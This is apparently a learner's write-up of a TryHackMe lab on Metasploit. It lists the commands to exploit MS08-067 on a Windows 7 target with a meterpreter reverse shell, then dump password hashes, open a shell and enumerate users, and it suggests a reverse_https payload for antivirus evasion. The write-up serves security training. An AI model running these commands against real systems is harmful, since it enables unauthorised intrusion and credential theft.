Metasploit Room - Try Hack Me 

Room : Metasploit - Try Hack Me

https://tryhackme.com/room/metasploitintro

Summary : In Metasploit, we use exploits provided by the platform to target vulnerable systems. After choosing an exploit, we set the target's IP address (RHOST) and port (RPORT) to start the attack. If it's successful, Metasploit creates a session between your system and the target, allowing remote access.

Once inside, you can run various commands to explore the system, gather information, and even escalate your privileges to gain more control. Metasploit also provides post-exploitation tools to maintain access, collect credentials, or pivot deeper into the network. It's a powerful framework that makes penetration testing more efficient and effective.

Tools :
-Metasploit Framework (Kali Linux or Parrot OS)

-Target Machine: Windows 7 (vulnerable)

Step:
1.Start Metasploit  --->   msfconsole
2.Search for an Exploit  --->  search ms08_067
3.Use the Exploit   --->   use exploit/windows/smb/ms08_067_netapi
4.Set Required Options   --->  set RHOST <Target_IP>
                                set RPORT 445
5.Set the Payload  --->  set PAYLOAD windows/meterpreter/reverse_tcp
                          set LHOST <Your_Attacking_IP>
                          set LPORT 4444
6.Exploit the Target  --->  exploit
7.Post-Exploitation   --->   getuid – shows current user
                            sysinfo – shows system info
                            hashdump – dump password hashes
                            shell – open a command shell
                            run post/windows/gather/enum_logged_on_users – list logged-in users
8.Cleanup   --->  exit / sessions -K

Result :
After you well donr its the result of your work :
                                                 Started reverse TCP handler on <Your_IP>:4444
                                                 Sending stage (175174 bytes) to <Target_IP>
                                                 Meterpreter session 1 opened

Concolution :
Now you know how to use Metasploit to identify and exploit a vulnerability in a Windows 7 machine. This room gives a practical introduction to working with exploits, payloads, and sessions!!
This is my tips:
              Always run show options after loading an exploit to check what needs to be set.
              Use search <keyword> to find relevant modules fast.
              Try different payloads like windows/x64/meterpreter/reverse_https for AV evasion.
              Take notes of each step—you’ll thank yourself later.
